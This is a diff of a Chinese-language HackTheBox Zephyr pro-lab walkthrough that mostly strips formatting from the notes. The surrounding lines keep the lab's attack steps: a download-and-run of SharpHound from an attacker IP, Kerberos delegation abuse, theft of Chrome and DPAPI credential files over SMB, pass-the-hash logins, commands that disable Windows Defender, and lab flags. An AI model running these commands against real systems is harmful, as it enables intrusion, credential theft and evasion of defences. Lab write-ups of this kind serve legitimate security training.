@@ -1426,7 +1426,7 @@ At line:1 char:72
     + FullyQualifiedErrorId : CommandNotFoundException
 ```
 
-### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">ps1-落地磁盘(失败)</font>
+### ps1-落地磁盘(失败)
 ```plain
 *Evil-WinRM* PS C:\Users\Public> IWR "http://10.10.16.8/SharpHound.ps1" -UseBasicParsing -OutFile "C:\Users\Public\SharpHound.ps1"; . "C:\Users\Public\SharpHound.ps1"; Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\Public" -ZipFileName "bh.zip"
 ```
@@ -2274,84 +2274,84 @@ Info: Upload successful!
 ```
 
 ### 委派原理
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">核心概念</font>
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">AllowedToDelegate</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">一般指受限委派，常见属性是</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">msDS-AllowedToDelegateTo</font>**`
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">它不是“这个账号自动就是管理员”，而是“这个账号对应的服务，被允许代表别人去访问特定 SPN”</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">典型场景：前端 Web 服务器收到用户登录后，需要替用户去访问后端数据库/文件服务</font>
+#### 核心概念
++ `**AllowedToDelegate**` 一般指受限委派，常见属性是 `**msDS-AllowedToDelegateTo**`
++ 它不是“这个账号自动就是管理员”，而是“这个账号对应的服务，被允许代表别人去访问特定 SPN”
++ 典型场景：前端 Web 服务器收到用户登录后，需要替用户去访问后端数据库/文件服务
 
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">Kerberos 里发生了什么</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">用户先向 KDC 申请自己的票据</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">用户访问前端服务，比如某台服务器上的 HTTP/CIFS 服务</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">如果这个前端服务账号具备委派能力，它可以向 KDC 申请“代表该用户”的后端服务票据</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">然后前端服务拿这个后端票据，去访问被允许的目标 SPN</font>
+#### Kerberos 里发生了什么
++ 用户先向 KDC 申请自己的票据
++ 用户访问前端服务，比如某台服务器上的 HTTP/CIFS 服务
++ 如果这个前端服务账号具备委派能力，它可以向 KDC 申请“代表该用户”的后端服务票据
++ 然后前端服务拿这个后端票据，去访问被允许的目标 SPN
 
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">两种常见委派</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">非约束委派：风险更大，服务能拿到用户的可转发 TGT，历史上很危险</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">受限委派：只能委派到</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">msDS-AllowedToDelegateTo</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">里列出的 SPN，范围小一些</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">基于资源的受限委派 RBCD：不是“我能委派到谁”，而是“目标主机允许谁代表别人访问我”</font>
+#### 两种常见委派
++ 非约束委派：风险更大，服务能拿到用户的可转发 TGT，历史上很危险
++ 受限委派：只能委派到 `**msDS-AllowedToDelegateTo**` 里列出的 SPN，范围小一些
++ 基于资源的受限委派 RBCD：不是“我能委派到谁”，而是“目标主机允许谁代表别人访问我”
 
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">S4U 是什么</font>
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">这是 Kerberos 里的“服务代用户”扩展。</font>
+#### S4U 是什么
+这是 Kerberos 里的“服务代用户”扩展。
 
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">S4U2Self</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">：服务先为“某个用户”申请一张到“自己”的服务票据</font>
-    - <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">意思像是：“我是这个服务，我想获得一张显示 Alice 来访问我的票据”</font>
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">S4U2Proxy</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">：服务再拿着上一步的结果，去申请“代表 Alice 访问后端服务”的票据</font>
-    - <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">前提是它被允许委派到那个目标 SPN</font>
++ `**S4U2Self**`：服务先为“某个用户”申请一张到“自己”的服务票据
+    - 意思像是：“我是这个服务，我想获得一张显示 Alice 来访问我的票据”
++ `**S4U2Proxy**`：服务再拿着上一步的结果，去申请“代表 Alice 访问后端服务”的票据
+    - 前提是它被允许委派到那个目标 SPN
 
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">所以常见链条是：</font>
+所以常见链条是：
 
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">先</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">S4U2Self</font>**`
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">再</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">S4U2Proxy</font>**`
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">最终得到“某高权限用户 -> 某目标服务”的服务票据</font>
++ 先 `**S4U2Self**`
++ 再 `**S4U2Proxy**`
++ 最终得到“某高权限用户 -> 某目标服务”的服务票据
 
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">为什么会危险</font>
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">危险点不在“委派”三个字本身，而在这几个条件叠加：</font>
+#### 为什么会危险
+危险点不在“委派”三个字本身，而在这几个条件叠加：
 
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">服务账号被配置了委派</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">它能委派到敏感服务，比如 DC 上的</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">CIFS</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">、</font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">HOST</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">、</font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">LDAP</font>**`
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">能伪装成高权限用户，比如 Domain Admin</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">目标服务一旦接受该票据，就会按高权限用户身份执行访问控制</font>
++ 服务账号被配置了委派
++ 它能委派到敏感服务，比如 DC 上的 `**CIFS**`、`**HOST**`、`**LDAP**`
++ 能伪装成高权限用户，比如 Domain Admin
++ 目标服务一旦接受该票据，就会按高权限用户身份执行访问控制
 
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">于是效果就变成：</font>
+于是效果就变成：
 
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">不是你自己变成域管</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">而是你拿到了一张“域管访问某服务”的合法 Kerberos 服务票据</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">如果那个服务足够敏感，结果就等价于高权限访问</font>
++ 不是你自己变成域管
++ 而是你拿到了一张“域管访问某服务”的合法 Kerberos 服务票据
++ 如果那个服务足够敏感，结果就等价于高权限访问
 
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">为什么不是所有 </font>`<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">AllowedToDelegate</font>`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 都能打到 DC</font>
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">因为它受限制：</font>
+#### 为什么不是所有 `AllowedToDelegate` 都能打到 DC
+因为它受限制：
 
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">只能去属性里指定的 SPN</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">不同 SPN 权限差异很大</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">有些用户账号是“敏感账号，不可委派”</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">某些保护机制会阻止票据被转发或限制协议转换</font>
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">服务跑在哪个账号下也很关键</font>
++ 只能去属性里指定的 SPN
++ 不同 SPN 权限差异很大
++ 有些用户账号是“敏感账号，不可委派”
++ 某些保护机制会阻止票据被转发或限制协议转换
++ 服务跑在哪个账号下也很关键
 
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">所以看到某账号能 delegate，不代表一定能直接拿域控。</font>
+所以看到某账号能 delegate，不代表一定能直接拿域控。
 
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">和 </font>`<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">TrustedToAuthForDelegation</font>`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> 的关系</font>
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">常见还会看到一个关键位：</font>
+#### 和 `TrustedToAuthForDelegation` 的关系
+常见还会看到一个关键位：
 
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">TRUSTED_TO_AUTH_FOR_DELEGATION</font>**`
++ `**TRUSTED_TO_AUTH_FOR_DELEGATION**`
 
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">它通常表示这个账号支持协议转换，也就是能走更强的 S4U 流程。  
-</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">很多实战里，大家会一起看：</font>
+它通常表示这个账号支持协议转换，也就是能走更强的 S4U 流程。  
+很多实战里，大家会一起看：
 
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">有没有</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">msDS-AllowedToDelegateTo</font>**`
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">有没有</font><font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);"> </font>`**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">TrustedToAuthForDelegation</font>**`
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">允许委派到哪些 SPN</font>
++ 有没有 `**msDS-AllowedToDelegateTo**`
++ 有没有 `**TrustedToAuthForDelegation**`
++ 允许委派到哪些 SPN
 
-#### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">高危目标为什么常见是 DC 的这些 SPN</font>
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">因为域控承载很多关键服务：</font>
+#### 高危目标为什么常见是 DC 的这些 SPN
+因为域控承载很多关键服务：
 
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">LDAP</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">：目录查询与很多域操作相关</font>
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">CIFS</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">：文件共享、远程管理场景常用</font>
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">HOST</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">：覆盖较广，很多系统服务依赖</font>
-+ `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">RPC</font>**`<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">/其他管理相关 SPN：可能触发更强能力</font>
++ `**LDAP**`：目录查询与很多域操作相关
++ `**CIFS**`：文件共享、远程管理场景常用
++ `**HOST**`：覆盖较广，很多系统服务依赖
++ `**RPC**`/其他管理相关 SPN：可能触发更强能力
 
-<font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">如果受限委派指向这些 SPN，风险就明显升高。</font>
+如果受限委派指向这些 SPN，风险就明显升高。
 
-### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">方法一:靶机Rubeus(失败)</font>
+### 方法一:靶机Rubeus(失败)
 > 失败原因：AV防护，Rubeus无回显
 >
 
@@ -2413,7 +2413,7 @@ export KRB5CCNAME=admin.ccache
 proxychains -q impacket-psexec -k -no-pass painters.htb/Administrator@DC.painters.htb
 ```
 
-### <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">方法二:Kali-Impacket</font>
+### 方法二:Kali-Impacket
 > 绕过所有 AV
 >
 
@@ -5044,14 +5044,14 @@ C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data
 
 ### 文件处理
 #### 文件打包
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">在目标机把 Chrome + DPAPI 材料打包到公共目录</font>
++ 在目标机把 Chrome + DPAPI 材料打包到公共目录
 
 ```plain
 powershell -c "Compress-Archive -LiteralPath 'C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Local State','C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data','C:\Users\marcus\AppData\Roaming\Microsoft\Protect\S-1-5-21-2734290894-461713716-141835440-4102' -DestinationPath 'C:\Users\Public\marcus_chrome_dpapi.zip' -Force"
 ```
 
 #### smb下载
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">用 SMB 把包拉回 Kali</font>
++ 用 SMB 把包拉回 Kali
 
 ```plain
 proxychains -q impacket-smbclient 'zsm.local/jamie:Pass@123@192.168.210.11'
@@ -5064,7 +5064,7 @@ get marcus_chrome_dpapi.zip
 ```
 
 #### 文件解压
-+ <font style="color:rgb(7, 5, 4);background-color:rgb(252, 252, 252);">kali文件解压</font>
++ kali文件解压
 
 ```plain
 ┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/dpapi]
@@ -5302,7 +5302,7 @@ NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126
 ```
 
 ## 机器用户 DCSync internal.zsm.local
-> <font style="color:rgb(6, 10, 38);background-color:rgba(6, 10, 38, 0.06);">$MACHINE.ACC 就是 ZPH-SVRCDC01$</font>
+> $MACHINE.ACC 就是 ZPH-SVRCDC01$
 >
 
 ```plain
@@ -6144,7 +6144,7 @@ Password : ToughPasswordToCrack123!
 NTLM     : 8cb21ab7f3ee6d782c724216bd88d1d1
 ```
 
-# <font style="color:rgb(6, 10, 38);">PNT-SVRPSB-192.168.110.54</font>
+# PNT-SVRPSB-192.168.110.54
 ## evil-winrm登录
 ```plain
 proxychains -q evil-winrm -i 192.168.110.54 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
@@ -6156,7 +6156,7 @@ proxychains -q evil-winrm -i 192.168.110.54 -u Administrator -H 5bdd6a33efe43f0d
 ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}
 ```
 
-# <font style="color:rgb(6, 10, 38);">ZPH-SVRCA01-192.168.210.12</font>
+# ZPH-SVRCA01-192.168.210.12
 ## smbclient
 ```plain
 proxychains -q impacket-smbclient -no-pass -hashes :84210eddc5724a7801fe78289ee94d44 zsm.local/administrator@192.168.210.12
@@ -6172,7 +6172,7 @@ proxychains -q impacket-smbclient -no-pass -hashes :84210eddc5724a7801fe78289ee9
 ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}
 ```
 
-# <font style="color:rgb(6, 10, 38);">ZPH-SVRCHR-192.168.210.17</font>
+# ZPH-SVRCHR-192.168.210.17
 ## 密码凭据
 我们在**ZPH-SVRSQL02-192.168.210.19当中拿到了凭据**
 
@@ -6417,13 +6417,13 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpywar
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 ```
 
-# <font style="color:rgb(6, 10, 38);">ZPH-SVRCSUP-192.168.210.18</font>
+# ZPH-SVRCSUP-192.168.210.18
 ## bloodshound
 BloodHound显示Melissa对ZPH-SVRCSUP有 CanPSRemote 权限（被加入了 Remote Management Use组）
 
 ![](/image/hackthebox-prolabs/Zephyr-25.png)
 
-## <font style="color:rgb(6, 10, 38);">Credential</font>
+## Credential
 > 在[ZPH-SVRCHR-192.168.210.17](#QtR2R)的shell中执行
 >
 > 条件：
@@ -6456,7 +6456,7 @@ Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock {type C:
 ZEPHYR{D0n7_f0rg3t_Imp0rt4nt_Inf0rm4710n}
 ```
 
-# <font style="color:rgb(51, 51, 51);">Flag </font>**Overview**
+# Flag **Overview**
 | 名称 | Flag | 获取位置 |
 | --- | --- | --- |
 | The Premonition | `ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}` | `Bad-Pdf` 获取 `riley` 后的早期阶段，原始 `flag.md` 保留 |
